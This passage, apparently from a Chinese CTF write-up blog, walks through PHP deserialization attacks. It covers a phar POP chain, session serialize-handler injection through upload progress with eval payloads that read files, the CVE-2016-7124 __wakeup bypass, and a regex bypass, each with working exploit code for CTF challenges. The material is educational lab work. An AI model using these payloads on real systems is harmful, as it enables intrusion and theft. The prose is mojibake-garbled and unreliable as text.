rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox</a><br>æ‰“å¼€é¡µé¢å‘ç°æ˜¯ä¸€ä¸ªæ³¨å†Œäºç™»å½•é¡µé¢,æ³¨å†Œç™»å½•å‘ç°æ˜¯ä¸ªç±»ä¼¼ç½‘ç›˜çš„åŠŸèƒ½ï¼Œåˆå§‹æ—¶åœ¨ç™»å½•å’Œæ³¨å†Œé¡µé¢å°è¯•sqlæ³¨å…¥å‘ç°ä¸è¡Œï¼Œç„¶ååœ¨ä¸‹è½½åŠŸèƒ½å°è¯•ä¸‹è½½å‘ç°ç™»å½•å’Œæ³¨å†Œä½ç½®å¯¹æ•°æ®åº“æ“ä½œè¿›è¡Œäº†prepare()çš„é¢„å¤„ç†ï¼Œç½‘ç›˜æœ‰ä¸ªä¸‹è½½åŠŸèƒ½ï¼Œå°è¯•ä¸‹è½½ï¼Œå°è¯•ä»»æ„ä¸‹è½½ï¼ŒæŠ“åŒ…ï¼Œå°†ä¸‹è½½å†…å®¹æ”¹ä¸ºæºç ï¼ˆæœ‰index.php class.php upload.php download.php login.php register.phpï¼‰ï¼Œä¸ºå•¥è¦åŠ ../../å‘¢ï¼Ÿï¼Ÿå‰æœŸæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œçœ‹äº†åˆ«äººé¢˜è§£å‘ç°ï¼Œä¸‹è½½æºç å‘ç°download.phpï¼Œé™åˆ¶äº†åˆ‡æ¢äº†ç›®å½•ï¼ŒåŒæ—¶æ²¡æ³•ä¸‹è½½å…¶ä»–ç›®å½•ï¼Œè¿™å°±æ˜¯åæ¥ä¸ºå•¥è¦ç”¨deleteåŠŸèƒ½æ¥phar://ï¼Œé‚£ä¸ªä½ç½®æ²¡æœ‰è¿›è¡Œç›®å½•çš„åˆ‡æ¢ï¼Œç„¶åæƒ³å°è¯•æ–‡ä»¶ä¸Šä¼ æ¥getshellï¼Œé¦–å…ˆä¸Šä¼ æ—¶è¿›è¡Œäº†åç¼€åˆ¤è¯»ï¼Œè€Œä¸”æˆ‘ä»¬ä¸çŸ¥é“ä¸Šä¼ åäº†è·¯å¾„ï¼Œæ‰€ä»¥è€ƒè™‘å…¶ä»–æ–¹æ³•</li></ul><p><img src="/images/pasted-66.png" alt="upload successful"></p><p><img src="/images/pasted-67.png" alt="upload successful"><br>æŸ¥çœ‹delete.phpï¼Œnew file()å…¶ç”¨äº†delete()å‡½æ•°ï¼Œåˆ°class.phpä¸­æŸ¥çœ‹detele()ä½¿ç”¨unlink()æ¥åˆ é™¤ï¼Œè€Œunlink()å‡½æ•°æ˜¯pharååºåˆ—åŒ–å—å½±å“å‡½æ•°ï¼Œé‚£ä¹ˆä¸‹é¢æˆ‘ä»¬æƒ³è¦çš„å°±æ˜¯æ„é€ å°±æ˜¯æ‰“å¼€æ˜¾ç¤ºflag.txtæ–‡ä»¶ï¼Œä¸ºå•¥flagåœ¨flag.txtä¸­æˆ‘å°±ä¸çŸ¥é“äº†ï¼Œå¯èƒ½ctfé€‰æ‰‹ç›´è§‰ï¼Œæœ‰ç‚¹ç„å­¦äº†ï¼Œå¦‚æœä½ çŸ¥é“å¯ä»¥è¯„è®ºå‘Šè¯‰æˆ‘æ„Ÿè°¢ï¼Œç»§ç»­ï¼Œåœ¨class.phpä¸­å‘ç°close()ä¸­Fileç±»file_get_contents(),ä½†æ˜¯æ²¡æ³•è°ƒç”¨ï¼Œç„¶åå‘ç°userç±»ä¸­çš„ææ„å‡½æ•°è°ƒç”¨äº†closeç±»ï¼Œå¦‚æœæˆ‘ä»¬ä»¤$db=new File();çš„åŒ–ï¼Œä½†æ˜¯è™½ç„¶æˆ‘ä»¬æ‰“å¼€äº†æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡ç”¨å›æ˜¾ï¼Œæ‰€ä»¥è¿˜æ˜¯çœ‹ä¸è§æ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥è¦æ„é€ å…¶ä»–çš„popé“¾ï¼Œç„¶åå‘ç°FileList()ä¸­å­˜åœ¨é­”æ³•å‡½æ•°_call,å¦‚æœè°ƒç”¨äº†ä¸å­˜åœ¨çš„å‡½æ•°å°±ä¼šæ‰§è¡Œï¼Œcallå‡½æ•°çš„ä½œç”¨:</p><pre><code> public function __call($func, $args) {        array_push($this-&gt;funcs, $func);      //å¦‚æœè°ƒç”¨äº†ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°†æ”¹æ–¹æ³•æ”¾åˆ°funcsæ•°ç»„ä¸­        foreach ($this-&gt;files as $file) {     //å†ä»filesæ•°ç»„ä¸­å–å‡ºæ–¹æ³•ï¼Œåˆ©ç”¨è¿™ä¸ªå…ƒç´ å»è°ƒç”¨funcsä¸­æ–°å¢çš„func            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();  //å› ä¸ºè°ƒç”¨äº†ä¸å­˜åœ¨çš„é”®å€¼close(),æ‰€ä»¥func=close,æ‰€ä»¥$file-&gt;$funcç›¸å½“äºè°ƒç”¨close()å‡½æ•°        }    }</code></pre><p>è€Œcloseå‡½æ•°æ‰“å¼€$this-&gt;filenameæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ Fileä¸­çš„filename=./flag.txtå°±èƒ½æ‰“å¼€è¯¥æ–‡ä»¶ï¼Œè€Œä¸”è¯¥æ–‡ä»¶çš„å†…å®¹å­˜å‚¨åˆ°äº†resultsæ•°ç»„é”®å€¼ä¸­ï¼Œç„¶åæˆ‘ä»¬æŸ¥çœ‹<br>Fileç±»ä¸­çš„ææ„å‡½æ•°ï¼Œå‘ç°:</p><pre><code>foreach ($this-&gt;results as $filename =&gt; $result) {            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) {                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            }</code></pre><p>è¿™é‡Œå¯¹resultçš„é”®å€¼è¿›è¡Œäº†è¾“å‡ºï¼Œæ‰€ä»¥å°±èƒ½å¾—åˆ°flag.txtä¸­çš„å†…å®¹<br>æœ€åpayload:</p><pre><code>&lt;?phpclass User {    public $db;}class File {    public $filename;}class FileList {    private $files;    public function __construct() {        $file = new File();        $file-&gt;filename = &quot;/flag.txt&quot;; //æ„é€ filenameè®©å…¶æ‰“å¼€è¯¥æ–‡ä»¶        $this-&gt;files = array($file);     }}// $a = new User();// $a-&gt;db = new FileList(); //è¿™é‡Œè®©FileListè°ƒç”¨äº†ä¸å­˜åœ¨å‡½æ•°close()å‡½æ•°$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;); //è®¾ç½®stub$o = new User();$o-&gt;db = new FileList(); //è¿™é‡Œè®©FileListè°ƒç”¨äº†ä¸å­˜åœ¨å‡½æ•°close()å‡½æ•°$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt;</code></pre><p><img src="/images/pasted-68.png" alt="upload successful"></p><h2 id="phpååºåˆ—åŒ–Sessionååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–Sessionååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–Sessionååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–Sessionååºåˆ—åŒ–</h2><h3 id="sessionåœ¨äº’è”ç½‘èµ·åˆ°çš„ä½œç”¨"><a href="#sessionåœ¨äº’è”ç½‘èµ·åˆ°çš„ä½œç”¨" class="headerlink" title="sessionåœ¨äº’è”ç½‘èµ·åˆ°çš„ä½œç”¨"></a>sessionåœ¨äº’è”ç½‘èµ·åˆ°çš„ä½œç”¨</h3><p>sessionç”¨äºè·Ÿè¸ªç”¨æˆ·çš„è¡Œä¸ºï¼Œä¿å­˜ç”¨æˆ·çš„ä¿¡æ¯å’ŒçŠ¶æ€ç­‰ç­‰<br>sessionå½“ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ç½‘ç«™æ—¶ï¼Œsession_start()å‡½æ•°å°±ä¼šåˆ›å»ºå”¯ä¸€çš„sessionidï¼Œé€šè¿‡HTTPå“åº”å°†sessionidä¿å­˜åˆ°ç”¨æˆ·çš„cookieä¸­ã€‚åŒæ—¶åœ¨æœåŠ¡å™¨åˆ›å»ºä¸€ä¸ªsessionidå‘½åçš„æ–‡ä»¶ï¼Œç”¨äºä¿å­˜è¿™ä¸ªç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚å½“ç”¨æˆ·å†æ¬¡è®¿é—®è¿™ä¸ªç½‘ç«™æ—¶ï¼Œä¹Ÿä¼šé€šè¿‡httpè¯·æ±‚å°†cookieä¸­ä¿å­˜çš„sessionå†æ¬¡æºå¸¦ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸ä¼šå†åˆ›å»ºåŒåæ–‡ä»¶ï¼Œè€Œæ˜¯ç¡¬ç›˜ä¸­å¯»æ‰¾sessionidçš„åŒåæ–‡ä»¶ï¼Œä¸”å°†å…¶è¯»å–å‡ºæ¥ã€‚<br>æœåŠ¡å™¨session_start()å‡½æ•°ä½œç”¨<br>å½“ä¼šè¯å¼€å§‹æˆ–é€šè¿‡session_start()å¼€å§‹æ—¶ï¼Œphpå†…éƒ¨ä¼šé€šè¿‡ä¼ æ¥çš„sessionidæ¥è¯»å–æ–‡ä»¶ï¼Œphpä¼šè‡ªåŠ¨åºåˆ—åŒ–sessioæ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†å…¶å¡«å……åˆ°è¶…å…¨å±€å˜é‡$_SESSIONä¸­ã€‚å¦‚æœä¸å­˜åœ¨å¯¹åº”çš„ä¼šè¯æ•°æ®ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªsessionidçš„æ–‡ä»¶ã€‚å¦‚æœç”¨æˆ·ä¸ºå‘é€sessionidï¼Œåˆ™åˆ›å»ºä¸€ä¸ªç”±32ä¸ªå­—æ¯ç»„æˆçš„phpsessionidï¼Œå¹¶è¿”å›set-cookie</p><h3 id="sessioné…ç½®å’Œphpsessionååºåˆ—åŒ–åŸç†"><a href="#sessioné…ç½®å’Œphpsessionååºåˆ—åŒ–åŸç†" class="headerlink" title="sessioné…ç½®å’Œphpsessionååºåˆ—åŒ–åŸç†"></a>sessioné…ç½®å’Œphpsessionååºåˆ—åŒ–åŸç†</h3><h4 id="php-iniä¸­çš„sessioné…ç½®"><a href="#php-iniä¸­çš„sessioné…ç½®" class="headerlink" title="php.iniä¸­çš„sessioné…ç½®"></a>php.iniä¸­çš„sessioné…ç½®</h4><p><img src="/images/pasted-69.png" alt="upload successful"><br>å› ä¸ºæˆ‘ä½¿ç”¨çš„æ˜¯phpstudyæ­å»ºçš„ç¯å¢ƒæ‰€ä»¥è·¯å¾„æ¯”è¾ƒå¥‡æ€ª<br>å¸¸è§çš„å­˜å‚¨ä½ç½®</p><pre><code>/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED</code></pre><h4 id="sessionååºåˆ—åŒ–åŸç†"><a href="#sessionååºåˆ—åŒ–åŸç†" class="headerlink" title="sessionååºåˆ—åŒ–åŸç†"></a>sessionååºåˆ—åŒ–åŸç†</h4><p>sessionçš„å­˜å‚¨æœºåˆ¶</p><p><img src="/images/pasted-70.png" alt="upload successful"><br>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?php//ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);session_start();$_SESSION[&#39;Lmg&#39;] = $_GET[&#39;a&#39;];echo &quot;&lt;pre&gt;&quot;;var_dump($_SESSION);echo &quot;&lt;/pre&gt;&quot;;?&gt;</code></pre><p>åˆ†åˆ«æ³¨é‡ŠæŸ¥çœ‹ä¸åŒæœºåˆ¶çš„ä¿å­˜æ–¹å¼ï¼Œæˆ‘ä»¬åˆ†åˆ«?a=123æŸ¥çœ‹</p><ul><li>Lmg|s:3:â€123â€;                     â€”â€”â€”â€”â€”-ini_set(â€˜session.serialize_handlerâ€™, â€˜phpâ€™);   phpæœºåˆ¶</li><li>a:1:{s:3:â€Lmgâ€;s:3:â€123â€;}         â€”â€”â€”â€”â€”-ini_set(â€œsession.serialize_handlerâ€, â€œphp_serializeâ€);   php_serializeæœºåˆ¶</li><li>Lmgs:3:â€123â€;                    â€”â€”â€”â€”â€”â€“ini_set(â€œsession.serialize_handlerâ€, â€œphp_binaryâ€);      php_binaryæœºåˆ¶<br>äº§ç”Ÿsessionååºåˆ—çš„åŸå› å°±åœ¨ç¨‹åºå‘˜åœ¨è¯»å–æˆ–è€…å­˜å‚¨ä¸­ä½¿ç”¨äº†ä¸åŒçš„æœºåˆ¶ï¼Œæˆ‘ä»¬ä»¥php_serializeæ ¼å¼æ¥å­˜å‚¨ï¼Œç”¨phpæœºåˆ¶æ¥è¯»å–<br>æµ‹è¯•ä»£ç ï¼š<br>å­˜å‚¨sessionä»£ç ï¼š<pre><code>&lt;?php//ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);session_start();$_SESSION[&#39;Lmg&#39;] = $_GET[&#39;a&#39;];echo &quot;&lt;pre&gt;&quot;;var_dump($_SESSION);echo &quot;&lt;/pre&gt;&quot;;?&gt;</code></pre>è¯»å–sessionä»£ç ï¼š<pre><code>&lt;?php  ini_set(&quot;session.serialize_handler&quot;, &quot;php&quot;);  session_start();  class student {      var $name;      var $age;      function __wakeup(){          echo $this-&gt;name;      }  }?&gt;</code></pre>æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ªstudentçš„ç±»æ¥ç”Ÿæˆæˆ‘ä»¬æƒ³è¦çš„ç›®çš„<pre><code>&lt;?php  class student {      var $name;      var $age;  }$Lmg = new student();$Lmg-&gt;name = &quot;hack&quot;;$Lmg-&gt;age = &quot;19&quot;;echo serialize($Lmg);?&gt;</code></pre>ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²<br><code>O:7:&quot;student&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;hack&quot;;s:3:&quot;age&quot;;s:2:&quot;19&quot;;}</code><br>æˆ‘ä»¬æ„é€ åœ¨å‚¨å­˜é¡µé¢æ„é€ payloadï¼Œåªéœ€è¦åœ¨ä¸Šé¢çš„å­—ç¬¦ä¸²å‰åŠ |å°±å¯ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿï¼Ÿ</li></ul><p><img src="/images/pasted-71.png" alt="upload successful"><br>å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ•°å€¼ä¸­æœ‰|é‚£ä¹ˆåœ¨è¯»å–æ—¶å°±è®¤ä¸ºåé¢æ˜¯æˆ‘ä»¬è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œä»è€Œè¾¾åˆ°ç›®çš„<br>å°†æ„é€ çš„å­—ç¬¦ä¸²ä¼ å…¥å­˜å‚¨phpä¸­è®¡ï¼š?a=|O:7:â€studentâ€:2:{s:4:â€nameâ€;s:4:â€hackâ€;s:3:â€ageâ€;s:2:â€19â€;}<br>æŸ¥çœ‹å‚¨å­˜çš„å­—ç¬¦ä¸²ï¼ša:1:{s:3:â€Lmgâ€;s:60:â€|O:7:â€studentâ€:2:{s:4:â€nameâ€;s:4:â€hackâ€;s:3:â€ageâ€;s:2:â€19â€;}<br>æ‰€ä»¥è¾¾åˆ°äº†ç›®çš„</p><p><img src="/images/pasted-72.png" alt="upload successful"><br>æŸ¥çœ‹ä¸€ä¸‹è¯»å–çš„phpï¼ŒæˆåŠŸæ‰“å°äº†hack</p><p><img src="/images/pasted-73.png" alt="upload successful"></p><h3 id="æ²¡æœ‰-SESSIONèµ‹å€¼çš„sessionååºåˆ—åŒ–"><a href="#æ²¡æœ‰-SESSIONèµ‹å€¼çš„sessionååºåˆ—åŒ–" class="headerlink" title="æ²¡æœ‰$_SESSIONèµ‹å€¼çš„sessionååºåˆ—åŒ–"></a>æ²¡æœ‰$_SESSIONèµ‹å€¼çš„sessionååºåˆ—åŒ–</h3><p>åœ¨phpä¸­å­˜åœ¨ä¸€ä¸ªupload_processæœºåˆ¶ï¼Œå¯ä»¥è‡ªåŠ¨åˆ›å»º$_SESSIONä¸€ä¸ªé”®å€¼å¯¹ï¼Œè€Œä¸”å…¶ä¸­çš„å€¼ç”¨æˆ·å¯ä»¥æ§åˆ¶ï¼Œæ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ </p><p><img src="/images/pasted-74.png" alt="upload successful"></p><p><img src="/images/pasted-75.png" alt="upload successful"><br>ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿæ„æ€ä¸Šä¼ æ–‡ä»¶ï¼ŒåŒæ—¶postä¸€ä¸ªäºsession.upload_process.nameåŒåçš„å˜é‡ã€‚åç«¯å°±ä¼šè‡ªåŠ¨å°†postçš„è¿™ä¸ªåŒåå˜é‡ä½œä¸ºé”®ï¼Œè¿›è¡Œåºåˆ—åŒ–ç„¶åå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ï¼Œä¸‹æ¬¡è¯·æ±‚å°±ä¼šååºåˆ—åŒ–sessionæ–‡ä»¶</p><h4 id="ä¸€ä¸ªctfé¢˜æ¥å®è·µäº†è§£ä¸€ä¸‹"><a href="#ä¸€ä¸ªctfé¢˜æ¥å®è·µäº†è§£ä¸€ä¸‹" class="headerlink" title="ä¸€ä¸ªctfé¢˜æ¥å®è·µäº†è§£ä¸€ä¸‹"></a>ä¸€ä¸ªctfé¢˜æ¥å®è·µäº†è§£ä¸€ä¸‹</h4><p>é¢˜ç›®åœ°å€ï¼š<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a><br>æ‰“å¼€é¢˜ç›®æ˜¯æºç ï¼š</p><pre><code>&lt;?php//A webshell is wait for youini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &#39;phpinfo();&#39;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&#39;phpinfo&#39;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&#39;index.php&#39;));}?&gt;</code></pre><p>å…ˆè¯»å–sessionï¼Œç„¶ågetä¼ å…¥phpinfoå‚æ•°ï¼Œç„¶ååˆ›å»ºå¯¹è±¡ï¼Œå¯¹è±¡ä¸­æ„é€ å‡½æ•°ç»™mdzzèµ‹å€¼phpinfoï¼Œææ„å‡½æ•°æ‰§è¡Œevalï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„æ˜¯å°†mdzzæ„é€ ä¸ºè¯»å–æ–‡ä»¶<br>ï¼Œå…ˆéšä¾¿ä¼ å…¥å‚æ•°ï¼ŒæŸ¥çœ‹phpinfoä¸­çš„å‚æ•°ï¼Œå‘ç°é»˜è®¤çš„ååºåˆ—åŒ–æœºåˆ¶æ˜¯php-serializeï¼Œä½†æ˜¯é¢˜ç›®æ‰€ä½¿ç”¨phpï¼Œé‚£ä¹ˆè¿™ä¸ªä¸¤ä¸ªæœºåˆ¶å†ä¸Šæ–‡äº§ç”Ÿçš„æ¼æ´æˆ‘ä»¬å·²ç»äº†è§£ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æ³•ç»™sessionè¿›è¡Œå­˜å‚¨å•Šï¼Œæ‰€ä»¥å°±è¦ç”¨åˆ°ä¸Šé¢sessionä¸Šä¼ è¿›åº¦çš„sessionå­˜å‚¨æ¥å­˜å…¥æˆ‘ä»¬æƒ³è¦çš„å†…å®¹</p><p><img src="/images/pasted-76.png" alt="upload successful"><br>æ„é€ ä¸Šä¼ è¡¨å•</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>ç„¶åæ„é€ æˆ‘ä»¬æƒ³è¦çš„payloadï¼Œæ‰“å°ç›®å½•æ–‡ä»¶print_r(scandir(dirname(<strong>FILE</strong>)));ï¼Œå¦‚æœå†™å…¥ææ„å‡½æ•°ä¼ševalæ‰§è¡Œ</p><pre><code>&lt;?phpclass OowoO {    public $mdzz;}$Lmg = new OowoO();$Lmg-&gt;mdzz = &quot;print_r(scandir(dirname(__FILE__)));&quot;;echo serialize($Lmg);?&gt;</code></pre><p>ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²<br><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code><br>æˆ‘ä»¬ç”¨ä¸Šä¼ è¡¨å•éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼ŒæŠ“åŒ…å°†filenameæ”¹ä¸º<br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;}</code><br>ä¸ºä»€ä¹ˆè¦æ”¹filenameï¼Œå› ä¸ºå…¶ä¼šè·Ÿfileæ•°ç»„ä¿å­˜åˆ°sessionä¸­ä¸Šé¢å›¾ç‰‡æœ‰è¯´æ˜<br>ä¸ºå•¥è¦åœ¨å­—ç¬¦ä¸²å‰åŠ |,è¿™ä¸ªä¸Šé¢ä¹Ÿè¯´è¿‡ï¼Œå› ä¸ºååºåˆ—åŒ–çš„æœºåˆ¶ä¸ä¸€æ ·ï¼Œ|åä¼šå½“åšè¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²<br>ä¸ºä»€ä¹ˆè¦å†â€å‰åŠ \ï¼Œå› ä¸ºæˆ‘ä»¬çš„å­—ç¬¦ä¸²æ˜¯æ”¾åœ¨filename=â€â€åŒå¼•å·å†…è¦è¿›è¡Œè½¬ä¹‰</p><p><img src="/images/pasted-77.png" alt="upload successful"><br>å‘ç°æˆåŠŸè¯»å–åˆ°æ–‡ä»¶åï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“æ–‡ä»¶ç›®å½•ï¼ŒæŸ¥çœ‹phpinfo()ï¼ŒæŸ¥çœ‹å½“å‰è„šæœ¬çš„è¿è¡Œè·¯å¾„</p><p><img src="/images/pasted-78.png" alt="upload successful"><br>æ‰€ä»¥æ„é€ ï¼šprint_r(file_get_contents(â€œ/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.phpâ€));æ¥è¯»å–è¿™ä¸ªæ–‡ä»¶<br>payloadï¼š</p><pre><code>&lt;?phpclass OowoO {    public $mdzz;}$Lmg = new OowoO();$Lmg-&gt;mdzz = &quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));&quot;;echo serialize($Lmg);?&gt;</code></pre><p>ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼ŒæˆåŠŸè·å¾—flag<br><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&quot;;}</code><br><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></p><p><img src="/images/pasted-79.png" alt="upload successful"></p><h2 id="phpååºåˆ—åŒ–å°æŠ€å·§"><a href="#phpååºåˆ—åŒ–å°æŠ€å·§" class="headerlink" title="phpååºåˆ—åŒ–å°æŠ€å·§"></a>phpååºåˆ—åŒ–å°æŠ€å·§</h2><h3 id="wakeupå¤±æ•ˆï¼šCVE-2016-7124"><a href="#wakeupå¤±æ•ˆï¼šCVE-2016-7124" class="headerlink" title="__wakeupå¤±æ•ˆï¼šCVE-2016-7124"></a>__wakeupå¤±æ•ˆï¼šCVE-2016-7124</h3><p>æ¼æ´åˆ©ç”¨ç‰ˆæœ¬ï¼š<br>php5&lt;5.6.25<br>php7&lt;7.0.10<br>æ¼æ´äº§ç”ŸåŸå› <br>å¦‚æœå­˜åœ¨_wakeupæ–¹æ³•ï¼Œè°ƒç”¨unserilize()æ–¹æ³•å‰åˆ™å…ˆè°ƒç”¨_wakeupæ–¹æ³•ï¼Œä½†æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å€™ï¼Œä¾¿ä¼šè·³è¿‡_wakeupçš„æ‰§è¡Œ<br>æµ‹è¯•ä»£ç ï¼š</p><pre><code>&lt;?phpclass demo{    public $name = &quot;Lmg&quot;;    public function __wakeup(){        echo &quot;this is __wakeup&lt;br&gt;&quot;;    }    public function __destruct(){        echo &quot;this is __destruct&lt;br&gt;&quot;;    }}// $a = new demo();// echo serialize($a);unserialize($_GET[&#39;Lmg&#39;]);?&gt;</code></pre><p><img src="/images/pasted-80.png" alt="upload successful"><br>å¯¹æ¯”å‘ç°é¡µé¢åªæ‰§è¡Œäº†<strong>destructæ–¹æ³•ï¼Œä»è€Œ</strong>wakeup()å¤±æ•ˆ</p><h4 id="ä¸€ä¸ªctfä¾‹é¢˜-unserialize3"><a href="#ä¸€ä¸ªctfä¾‹é¢˜-unserialize3" class="headerlink" title="ä¸€ä¸ªctfä¾‹é¢˜(unserialize3)"></a>ä¸€ä¸ªctfä¾‹é¢˜(unserialize3)</h4><p>é¢˜ç›®åœ°å€:<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4821&page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1</a><br>æ‰“å¼€é¢˜ç›®ç›´æ¥æ˜¯éƒ¨åˆ†æºç ï¼Œçœ‹åˆ°wakeupå‡½æ•°åº”è¯¥æƒ³åˆ°æ˜¯åˆ©ç”¨__wakeup()å¤±æ•ˆæ¼æ´<br>é¢˜ç›®æºç ï¼š</p><pre><code>class xctf{public $flag = &#39;111&#39;;public function __wakeup(){exit(&#39;bad requests&#39;);}?code=</code></pre><p>æ„é€ payloadï¼š</p><pre><code>&lt;?phpclass xctf{public $flag = &#39;111&#39;;}$Lmg = new xctf();echo serialize($Lmg);?&gt;</code></pre><p>ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼š<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code><br>æˆåŠŸè·å¾—flag</p><p><img src="/images/pasted-81.png" alt="upload successful"></p><h3 id="bypassååºåˆ—åŒ–æ­£åˆ™"><a href="#bypassååºåˆ—åŒ–æ­£åˆ™" class="headerlink" title="bypassååºåˆ—åŒ–æ­£åˆ™"></a>bypassååºåˆ—åŒ–æ­£åˆ™</h3><p>å½“æ‰§è¡Œååºåˆ—åŒ–æ—¶ï¼Œä½¿ç”¨æ­£åˆ™<code>&#39;/[oc]:\d+:/i&#39;</code><br>è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œä¸»è¦æ‹¦æˆªO:æ•°å­—:çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œé‚£è¦æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿï¼Ÿï¼Ÿ<br>phpååºåˆ—åŒ–æ—¶O:+4:å’ŒO:4:çš„è§£ææ˜¯ä¸€æ ·çš„,å…·ä½“æ˜¯phpçš„å†…æ ¸æ˜¯è¿™ä¹ˆå†™çš„<br>æ‰€ä»¥å¯ä»¥é€šè¿‡åŠ +æ¥è¿›è¡Œç»•è¿‡</p><h4 id="ä¸€ä¸ªctfä¾‹é¢˜-Web-php-unserialize"><a href="#ä¸€ä¸ªctfä¾‹é¢˜-Web-php-unserialize" class="headerlink" title="ä¸€ä¸ªctfä¾‹é¢˜(Web_php_unserialize)"></a>ä¸€ä¸ªctfä¾‹é¢˜(Web_php_unserialize)</h4><p>é¢˜ç›®åœ°å€ï¼š<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1" target="_blank" 